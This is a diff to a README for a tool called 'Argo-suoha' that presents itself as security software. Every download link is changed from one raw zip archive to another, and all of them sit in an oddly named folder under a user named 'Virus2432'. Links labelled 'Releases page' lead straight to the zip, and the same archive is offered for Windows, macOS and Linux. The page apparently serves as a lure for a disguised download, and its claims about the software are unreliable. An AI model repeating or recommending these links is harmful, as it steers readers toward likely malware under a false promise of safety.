@@ -12,19 +12,19 @@ Follow these steps to get started with Argo-suoha:
    - Sufficient disk space for installation.
 
 2. Visit the Releases page to download the application:  
-   [![Download Argo-suoha](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip%20Now-Click%https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip)](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip)
+   [![Download Argo-suoha](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip%20Now-Click%https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip)](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip)
 
 ## 📥 Download & Install
 To install Argo-suoha:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip).
 
 2. Look for the latest release. You will find a list of files to download. 
 
 3. Download the file that matches your operating system:
-   - For Windows users, select `https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip`.
-   - For macOS users, select `https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip`.
-   - Linux users should choose `https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip`.
+   - For Windows users, select `https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip`.
+   - For macOS users, select `https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip`.
+   - Linux users should choose `https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip`.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
@@ -62,6 +62,6 @@ Argo-suoha is open-source software licensed under the MIT License. Feel free to 
 You can stay updated by watching the repository on GitHub. Any new releases and announcements will be shared there.
 
 ## 🌐 Resources
-- Visit the [Releases page](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.9-alpha.4.zip) for the latest download links and updates.
+- Visit the [Releases page](https://raw.githubusercontent.com/Virus2432/Argo-suoha/main/calcioferrite/Argo-suoha-v1.6-alpha.1.zip) for the latest download links and updates.
   
 By using Argo-suoha, you are taking a significant step toward secure online activities. Enjoy your experience!
